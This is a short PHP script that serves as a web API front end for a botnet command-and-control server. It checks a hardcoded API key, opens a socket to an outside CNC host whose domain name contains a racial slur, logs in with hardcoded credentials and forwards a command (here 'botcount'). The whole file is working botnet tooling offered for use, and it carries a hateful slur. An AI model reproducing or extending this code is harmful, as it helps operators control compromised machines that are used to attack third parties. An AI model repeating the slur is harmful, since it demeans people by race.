<?php
//API Link: http://api.niggerkiller.xyz/bots.php?key=YunoWantsBots&Endpoint=Botcount
set_time_limit(0);
 
$server = "api.niggerkiller.xyz";
$conport = 420;
$username = "YunoTop";
$password = "yuno211";
$APIKeys = array("YunoWantsBots");
 
$Endpoint = $_GET['Endpoint'];
$key = $_GET['key'];

if (!isset($_GET["key"]) || !isset($_GET["Endpoint"]))
    die("<p>You are missing a parameter");
if (!in_array($key, $APIKeys)) die("Invalid API key");

if($Endpoint == "Botcount"){$command = "botcount";}

$sock = fsockopen($server, $conport, $errno, $errstr, 2);
 
if(!$sock){
        echo "Couldn't Connect To CNC Server Please Check CNC Creds...";
} else{
        print(fread($sock, 512)."\r\n");
        fwrite($sock, $username . "\r\n");
        echo "<br>";
        print(fread($sock, 512)."\r\n");
        fwrite($sock, $password . "\r\n");
        echo "<br>";
        if(fread($sock, 512)) {
                print(fread($sock, 512)."\r\n");
        }
 
        fwrite($sock, $command . "\r\n");
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>